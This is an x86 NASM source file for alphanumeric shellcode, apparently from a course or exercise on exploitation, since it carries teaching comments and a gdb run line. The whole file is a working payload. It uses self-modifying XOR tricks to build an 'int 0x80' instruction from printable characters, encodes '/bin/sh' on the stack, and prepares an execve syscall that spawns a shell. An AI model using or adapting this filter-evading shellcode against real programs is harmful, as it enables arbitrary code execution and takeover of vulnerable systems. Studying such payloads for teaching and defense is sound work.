; nasm shellcode.asm && gdb --args ./demo shellcode

bits 32
%include "include/all.asm"
codelen equ inject-$

start_listing:

; Store initial instruction pointer
    push eax ; push the eip, which is incidentally stored in eax
    pop edx

; Construct a 0x80 for interrupt
    ; Clear eax and ecx
    push 'xxxx'
    pop eax
    xor eax, 'xxxx'

    ; Push 0-bytes for later use
    push eax
    push eax

    ; Create 0x80 in eax
    xor al, '0' ; Getting highest possible number from ascii chars (0x7F)
    xor al, 'O'

    push eax ; Move eax to ecx to allow increment
    pop ecx
    inc ecx ; 0x80

    push ecx ; move 0x80 back to eax
    pop eax

    ; We have 0x80 in both eax and ecx

    xor al, 'M' ; 0x4D XOR 0x80 = 0xCD

    ; We now have 0xCD and 0x80 in eax and ecx respectively
    ; We place them at the point we want them executed

    ;int3 ; Mads, 'Construct and insert "int 0x80"'
    xor [edx+codelen], al
    xor [edx+codelen+1], cl

    ; Use 0-bytes on stack to clear ecx and edx
    pop ecx
    pop edx

    ; Push '/sh\0'
    push 'a000'
    pop eax
    xor eax, 'NCX0'
    push eax

    ; Push '/bin'
    push 'a004'
    pop eax
    xor eax, 'NRYZ'
    push eax

    ; move esp to ebx
    push esp
    pop eax

    push eax
    push ecx
    push edx
    push eax
    push eax
    push ebp
    push esi
    push edi
    popad

    ;mov eax, SYS_execve
    ; Use 0-bytes on stack to clear ecx and edx
    push 'xxxx'
    pop eax
    xor eax, 'xxxx'
    ;xor al, SYS_execve
    xor al, 'O' ; O  = 01001111
    xor al, 'D' ; D  = 01000100
                ; al = 00001011

inject:
